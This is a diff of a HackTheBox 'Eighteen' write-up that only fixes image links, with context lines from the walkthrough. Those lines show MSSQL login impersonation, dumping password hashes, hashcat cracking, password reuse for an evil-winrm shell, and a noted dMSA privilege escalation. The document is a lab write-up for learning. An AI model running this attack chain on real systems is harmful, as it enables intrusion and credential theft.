@@ -76,15 +76,15 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 Host script results:
 |_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m02
 ```
-![Pasted image 20251208114057](../Attachments/Pasted20image%2020251208114057.png)
+![Pasted image 20251208114057](../Attachments/Pasted%20image%2020251208114057.png)
 
 - I can mssql into the target but cant execute many commands. I do find a database `financial_planner`
 - I create a new account on the website `test:test` and login:
-![Pasted image 20251208114712](../Attachments/Pasted20image%2020251208114712.png)
-![Pasted image 20251208114728](../Attachments/Pasted20image%2020251208114728.png)
+![Pasted image 20251208114712](../Attachments/Pasted%20image%2020251208114712.png)
+![Pasted image 20251208114728](../Attachments/Pasted%20image%2020251208114728.png)
 
 - Cant access admin dashboard with this account:
-![Pasted image 20251208114759](../Attachments/Pasted20image%2020251208114759.png)
+![Pasted image 20251208114759](../Attachments/Pasted%20image%2020251208114759.png)
 
 - Going to mysql I can connect with the given credentials and these commands provide me the current user, the database names and the users in the mssql environment:
 ```
@@ -94,18 +94,18 @@ impacket-mssqlclient kevin@eighteen.htb
 
 > select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
 ```
-![Pasted image 20251208134122](../Attachments/Pasted20image%2020251208134122.png)
+![Pasted image 20251208134122](../Attachments/Pasted%20image%2020251208134122.png)
 - I can also list the databases:
 ```
 SELECT name FROM sys.databases;
 ```
-![Pasted image 20251208134456](../Attachments/Pasted20image%2020251208134456.png)
+![Pasted image 20251208134456](../Attachments/Pasted%20image%2020251208134456.png)
 - However I don't have permissions to see `financial_planner`
 - I can pass the `exec_as_login` command to run as user `appdev`
 ```
 exec_as_login appdev
 ```
-![Pasted image 20251208134310](../Attachments/Pasted20image%2020251208134310.png)
+![Pasted image 20251208134310](../Attachments/Pasted%20image%2020251208134310.png)
 
 - Using `appdev` I can access financial planner:
 ```
@@ -167,7 +167,7 @@ hashcat -m 10900 hash /usr/share/wordlists/rockyou.txt -a 0 --force
 ---RELEVANT-OUTPUT---
 sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=:iloveyou1
 ```
-![Pasted image 20251208135741](../Attachments/Pasted20image%2020251208135741.png)
+![Pasted image 20251208135741](../Attachments/Pasted%20image%2020251208135741.png)
 
 - I can login to the website with `admin:iloveyou1` but there is nothing there.
 
@@ -189,10 +189,10 @@ MSSQL       10.10.11.95     1433   DC01             1612: EIGHTEEN\dave.green
 ```
 evil-winrm -u 'adam.scott' -p 'iloveyou1' -i 10.10.11.95
 ```
-![Pasted image 20251208135935](../Attachments/Pasted20image%2020251208135935.png)
+![Pasted image 20251208135935](../Attachments/Pasted%20image%2020251208135935.png)
 
 - I grab user flag:
-![Pasted image 20251208135954](../Attachments/Pasted20image%2020251208135954.png)
+![Pasted image 20251208135954](../Attachments/Pasted%20image%2020251208135954.png)
 
 - If we check winpeas we see the windows build version is vulnerable dmsa vulnerability
 - Using rubeus and getST we could impersonate admin and get hash
